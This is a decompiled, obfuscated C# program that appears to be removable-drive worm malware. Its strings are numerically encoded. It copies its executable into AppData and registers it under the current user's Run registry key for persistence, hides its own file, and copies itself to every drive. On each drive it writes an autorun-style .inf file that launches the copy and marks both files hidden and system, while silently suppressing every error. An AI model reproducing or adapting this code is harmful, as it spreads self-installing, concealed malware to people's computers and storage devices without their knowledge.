using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using adudule.My;

namespace adudule;

internal class uayQcROIaXtdouqCTUpqBYFiyelFNChddbgSLSwXJYcf
{
	[DebuggerNonUserCode]
	public uayQcROIaXtdouqCTUpqBYFiyelFNChddbgSLSwXJYcf()
	{
	}

	public static void khEnxEzMdezBKhPsIouOWMrmnlqbUbGgSimogGiNxshC()
	{
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("37|129|151|152|152|83|138|157|138|");
			if (File.Exists(text))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text);
			}
			File.Copy(Application.get_ExecutablePath(), text);
			((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey(EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("37|120|116|107|121|124|102|119|106|129|114|142|136|151|148|152|148|139|153|129|124|142|147|137|148|156|152|129|104|154|151|151|138|147|153|123|138|151|152|142|148|147|129|119|154|147|"), writable: true)!.SetValue("1" + Application.get_ProductName(), text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void khEnxEzMdezBKhPsIouOWMrmnlqbUbGgSimogGiNxshC3()
	{
		try
		{
			File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void khEnxEzMdezBKhPsIouOWMrmnlqbUbGgSimogGiNxshC6()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		checked
		{
			try
			{
				ListBox val = new ListBox();
				for (int i = 0; i != ((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives().Count - 1; i++)
				{
					val.get_Items().Add((object)((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives()[i].ToString());
				}
				for (int i = 0; i != val.get_Items().get_Count(); i++)
				{
					try
					{
						try
						{
							try
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("79|162|180|178|196|193|184|195|200|130|125|135|125|180|199|180|"))));
								((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("79|177|190|190|195|125|184|189|181|"))));
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
							}
							((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("79|162|180|178|196|193|184|195|200|130|125|135|125|180|199|180|"))));
							FileSystem.FileOpen(1, Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("79|177|190|190|195|125|184|189|181|"))), (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
							FileSystem.FilePut(1, EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("74|165|171|191|190|185|188|191|184|167|") + "\r\n" + EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("74|189|178|175|182|182|175|194|175|173|191|190|175|135|157|175|173|191|188|179|190|195|125|120|130|120|175|194|175|"), -1L, false);
							FileSystem.FileClose(new int[1] { 1 });
							try
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("79|162|180|178|196|193|184|195|200|130|125|135|125|180|199|180|")))).Attributes = FileAttributes.Hidden | FileAttributes.System;
								((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("79|177|190|190|195|125|184|189|181|")))).Attributes = FileAttributes.Hidden | FileAttributes.System;
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
	}
}
